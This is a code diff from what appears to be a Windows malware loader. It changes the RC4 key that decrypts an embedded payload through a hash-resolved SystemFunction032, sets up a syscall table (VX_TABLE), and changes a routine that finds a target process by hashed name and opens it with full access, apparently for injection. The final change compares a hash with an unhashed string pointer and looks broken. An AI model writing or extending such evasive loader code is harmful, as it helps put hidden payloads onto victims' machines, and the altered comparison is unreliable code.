@@ -3,7 +3,7 @@
 #include "Common.h"
 #include "Debug.h"
 
-UCHAR ProtectedKey[] = { 0x13, 0x18, 0x14, 0x8D, 0x83, 0xD0, 0xC6, 0x06, 0x43, 0x9C, 0x6B, 0x5D, 0x01, 0x3D, 0x09, 0xFD };
+UCHAR ProtectedKey[] = { 0x36, 0x26, 0x54, 0x7A, 0x42, 0xFA, 0x3B, 0x72, 0xBF, 0x35, 0x45, 0x2C, 0xBD, 0x80, 0x76, 0x87 };
 
 // global `VX_TABLE` structure
 VX_TABLE 	g_Sys = { 0 };
@@ -107,7 +107,7 @@ BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4
 
 	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
 	// And using its return as the hModule parameter in GetProcAddress
-	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Cryptsp"), SystemFunction032_JOAA);
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Advapi32"), SystemFunction032_JOAA);
 
 	// If SystemFunction032 calls failed it will return non zero value
 	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
@@ -274,7 +274,7 @@ BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess
 
 		// Small check for the process's name size
 		// Comparing the enumerated process name to what we want to target
-		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
+		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == szProcName) {
 			// Opening a handle to the target process and saving it, then breaking
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
 			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
